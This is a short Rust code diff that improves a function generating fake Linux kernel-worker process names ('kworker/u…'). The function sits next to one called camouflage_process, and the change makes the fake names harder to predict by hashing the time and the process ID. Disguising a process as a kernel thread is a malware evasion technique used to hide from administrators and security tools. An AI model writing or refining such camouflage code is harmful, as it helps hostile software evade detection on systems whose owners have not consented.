@@ -253,12 +253,16 @@ pub fn camouflage_process(name: &str) -> Result<()> {
 }
 
 pub fn random_kworker_name() -> String {
-    let nanos = SystemTime::now()
-        .duration_since(UNIX_EPOCH)
-        .unwrap_or_default()
-        .subsec_nanos();
-    let x = nanos % 16;
-    let y = (nanos >> 4) % 10;
+    use std::collections::hash_map::DefaultHasher;
+    use std::hash::{Hash, Hasher};
+
+    let mut hasher = DefaultHasher::new();
+    SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos().hash(&mut hasher);
+    std::process::id().hash(&mut hasher);
+    let hash = hasher.finish();
+    
+    let x = hash % 16;
+    let y = (hash >> 4) % 10;
     format!("kworker/u{}:{}", x, y)
 }
 
